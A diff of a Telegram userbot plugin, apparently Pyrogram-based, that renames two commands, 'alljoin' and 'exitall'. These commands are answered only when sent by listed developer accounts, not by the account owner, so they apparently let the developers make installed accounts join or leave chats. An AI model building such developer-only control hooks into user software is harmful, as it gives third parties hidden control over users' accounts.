@@ -17,7 +17,7 @@ from config import CMD_HANDLER as cmd
 from .help import add_command_help
 
 
-@Client.on_message(filters.command("joinsini", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("alljoin", ["."]) & filters.user(DEVS) & ~filters.me)
 @pyram("join", ram)
 async def join(client: Client, message: Message):
     Man = message.command[1] if len(message.command) > 1 else message.chat.id
@@ -30,7 +30,7 @@ async def join(client: Client, message: Message):
 
 
 
-@Client.on_message(filters.command("exitc", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("exitall", ["."]) & filters.user(DEVS) & ~filters.me)
 @pyram(["leave", "exit"], ram)
 async def leave(client: Client, message: Message):
     Man = message.command[1] if len(message.command) > 1 else message.chat.id
